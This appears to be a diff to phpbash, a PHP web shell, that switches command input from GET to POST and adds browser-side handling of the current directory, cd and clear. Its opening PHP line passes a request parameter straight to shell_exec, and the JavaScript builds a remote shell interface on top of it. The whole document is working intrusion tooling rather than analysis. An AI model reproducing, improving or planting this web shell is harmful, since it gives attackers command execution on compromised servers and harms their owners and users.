@@ -1,4 +1,4 @@
-<?php if (ISSET($_GET['cmd'])) { echo shell_exec($_GET['cmd']." 2>&1"); die(); } ?>
+<?php /* phpbash by Alexander Reid (Arrexel) */ if (ISSET($_POST['cmd'])) { echo shell_exec($_POST['cmd']." 2>&1"); die(); } ?>
 
 <html>
     <head>
@@ -102,38 +102,65 @@
         </div>
         <script type="text/javascript">
             var username = "";
-            getUsername();
+            var currentDir = "";
+            getShellInfo();
             
-            function getUsername() {
+            function getShellInfo() {
                 var request = new XMLHttpRequest();
                 
                 request.onreadystatechange = function() {
                     if (request.readyState == XMLHttpRequest.DONE) {
-                        username = request.responseText.replace(/(?:\r\n|\r|\n)/g, "");
-                        document.getElementById("username").innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"</div>#";
+                        var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
+                        username = parsedResponse[0];
+                        currentDir =  parsedResponse[1];
+                        
+                        document.getElementById("username").innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"</div>:"+currentDir+"#";
                     }
                 };
 
-                request.open("GET", "?cmd="+encodeURI("whoami"), true);
-                request.send();
+                request.open("POST", "", true);
+                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                request.send("cmd=whoami; pwd");
             }
-            
+                        
             function sendCommand() {
                 var request = new XMLHttpRequest();
                 var command = document.getElementById('inputtext').value;
+                var originalCommand = command;
+                var originalDir = currentDir;
                 var outputElement = document.getElementById("output");
+                var cd = false;
                 
                 document.getElementById('inputtext').value = "";
 
+                var parsedCommand = command.split(" ")[0];
+                if (parsedCommand == "cd") {
+                    cd = true;
+                    command = "cd "+currentDir+"; "+command+"; pwd";
+                } else if (parsedCommand == "clear") {
+                    outputElement.innerHTML = "";
+                    return false;
+                } else {
+                    command = "cd "+currentDir+"; " + command;
+                }
+                
                 request.onreadystatechange = function() {
                     if (request.readyState == XMLHttpRequest.DONE) {
-                        outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"</div><div style='float: left;'>"+"# "+command+"</div><br>" + request.responseText.replace(/(?:\r\n|\r|\n)/g, "<br>");
-                        outputElement.scrollTop = outputElement.scrollHeight;
+                        if (cd) {
+                            var parsedResponse = request.responseText.replace(/(?:\r\n|\r|\n)/g, ",").split(",");
+                            currentDir = parsedResponse[parsedResponse.length-2];
+                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
+                            document.getElementById("username").innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"</div>:"+currentDir+"#";
+                        } else {
+                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(/(?:\r\n|\r|\n)/g, "<br>");
+                            outputElement.scrollTop = outputElement.scrollHeight;
+                        } 
                     }
                 };
 
-                request.open("GET", "?cmd="+encodeURI(command), true);
-                request.send();
+                request.open("POST", "", true);
+                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                request.send("cmd="+command);
                 return false;
             }
             
